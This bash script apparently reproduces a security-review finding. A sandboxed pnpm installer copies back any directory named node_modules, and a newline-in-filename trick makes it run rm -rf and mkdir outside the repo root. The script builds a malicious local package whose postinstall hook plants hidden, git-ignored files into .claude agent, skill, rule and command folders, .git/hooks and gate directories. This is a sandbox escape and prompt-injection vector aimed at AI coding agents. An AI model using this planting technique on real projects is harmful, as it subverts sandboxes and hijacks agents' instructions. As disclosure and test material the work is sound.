#!/usr/bin/env bash
# DG1 round-3 code-security reproduction (T-DG1-REV-SEC-R3): copy-back escape in tools/deps/install-sandbox.sh.
#
# D-051 runs pnpm in a disposable writable copy ($WS) and then copies back "ONLY node_modules":
#     while read nm; do rel="${nm#"$WS"/}"; dest="$REPO_ROOT/$rel"; mkdir -p "$(dirname "$dest")"; rm -rf "$dest"; cp -a "$nm" "$dest"
#     done < <(find "$WS" -type d -name node_modules -prune)
# Every directory NAMED node_modules anywhere in $WS is copied back, at the same relative path, with arbitrary contents.
# Dependency code that runs inside the sandbox (an allow-listed lifecycle script — exactly what the sandbox exists to
# contain) can therefore create files in the REAL tree under protected control paths (.claude/, .git/, tools/gates/,
# docs/delivery/, …) and new config directories, by naming the leaf directory node_modules. The planted paths are
# git-ignored (.gitignore: node_modules/), so `git status` (AC-7's "repo unchanged" test) does not show them.
# Second vector: find prints one path per line and the loop reads lines, so a directory whose name contains a newline
# splits into a forged relative path; with a "\n.." name the installer runs rm -rf / mkdir -p OUTSIDE the root.
#
# Usage: repro-copyback-escape.sh <path-to-install-sandbox.sh>
#   Runs ONLY in a scratch project under $TMPDIR (never the real repo). Needs a writable pnpm store
#   (npm_config_store_dir); no network needed (local file: dependency).
set -uo pipefail
WRAP="${1:?usage: $0 <install-sandbox.sh>}"
S="$(mktemp -d "${TMPDIR:?}/cbx.XXXXXX")"
ROOT="$S/repo"; VICTIM="$S/victim"
mkdir -p "$ROOT/evil" "$ROOT/.claude/agents" "$ROOT/tools/gates" "$ROOT/docs/delivery" "$VICTIM/node_modules"
echo keep > "$VICTIM/node_modules/keep.txt"           # a sibling of the root, OUTSIDE it
echo "# agent" > "$ROOT/.claude/agents/a.md"
echo "// gate" > "$ROOT/tools/gates/validate.mjs"
cat > "$ROOT/evil/package.json" <<'JSON'
{ "name": "evil", "version": "1.0.0", "scripts": { "postinstall": "node plant.js" } }
JSON
cat > "$ROOT/evil/plant.js" <<'JS'
// Runs inside the sandbox, cwd = the package dir in the disposable copy; INIT_CWD = the copy's root ($WS).
const fs = require('fs'), p = require('path'), W = process.env.INIT_CWD;
const plant = (rel, file, body) => { fs.mkdirSync(p.join(W, rel), { recursive: true }); fs.writeFileSync(p.join(W, rel, file), body); };
plant('.claude/rules/node_modules',  'injected.md', 'PLANTED: instruction text auto-loaded as project memory\n');
plant('.claude/skills/node_modules', 'SKILL.md',    '---\nname: node_modules\ndescription: PLANTED skill\n---\nPLANTED\n');
plant('.claude/commands/node_modules','pwn.md',     'PLANTED command\n');
plant('.claude/agents/node_modules', 'evil.md',     'PLANTED agent definition\n');
plant('.git/hooks/node_modules',     'x',           'PLANTED inside .git\n');
plant('tools/gates/node_modules',    'x',           'PLANTED inside tools/gates\n');
plant('docs/delivery/node_modules',  'x',           'PLANTED inside docs/delivery\n');
plant('.vscode/node_modules',        'x',           'PLANTED: creates .vscode/\n');
// newline vector: "h\n.." + "/victim/node_modules"  ->  find line 2 = "../victim/node_modules" -> dest = $ROOT/../victim/node_modules
fs.mkdirSync(p.join(W, 'h\n..', 'victim', 'node_modules'), { recursive: true });
JS
cat > "$ROOT/package.json" <<'JSON'
{ "name": "cbx-root", "version": "1.0.0", "private": true,
  "dependencies": { "evil": "file:./evil" },
  "pnpm": { "onlyBuiltDependencies": ["evil"] } }
JSON
git -C "$ROOT" init -q && printf 'node_modules/\n' > "$ROOT/.gitignore" && git -C "$ROOT" add -A && git -C "$ROOT" -c user.email=r@x -c user.name=r -c commit.gpgsign=false commit -qm base
echo "== git status before: $(git -C "$ROOT" status --porcelain | wc -l) line(s)"
echo "== victim before: $(ls "$VICTIM/node_modules" 2>&1)"
echo "== in-sandbox direct write to the real root (control): $("$WRAP" --root "$ROOT" run -- bash -c 'echo x > .claude/rules-direct 2>&1; echo rc=$?' 2>&1 | tr '\n' ' ')"
( cd "$ROOT" && "$WRAP" --root "$ROOT" create >/dev/null 2>"$S/install.err" ); echo "== installer create exit=$?"
sed 's/^/   stderr: /' "$S/install.err" | tail -5
echo "== planted paths now present in the REAL root (host side, after the installer exited):"
for f in .claude/rules/node_modules/injected.md .claude/skills/node_modules/SKILL.md .claude/commands/node_modules/pwn.md \
         .claude/agents/node_modules/evil.md .git/hooks/node_modules/x tools/gates/node_modules/x docs/delivery/node_modules/x .vscode/node_modules/x; do
  if [ -f "$ROOT/$f" ]; then echo "   PRESENT  $f  ($(head -c 60 "$ROOT/$f" | head -1))"; else echo "   absent   $f"; fi
done
echo "== git status after: $(git -C "$ROOT" status --porcelain | wc -l) line(s)  (planted files are git-ignored):"; git -C "$ROOT" status --porcelain | sed "s/^/   /"
echo "== victim (outside the root) after: $(ls -la "$VICTIM/node_modules" 2>&1 | tr '\n' ' ')"
rm -rf "$S"
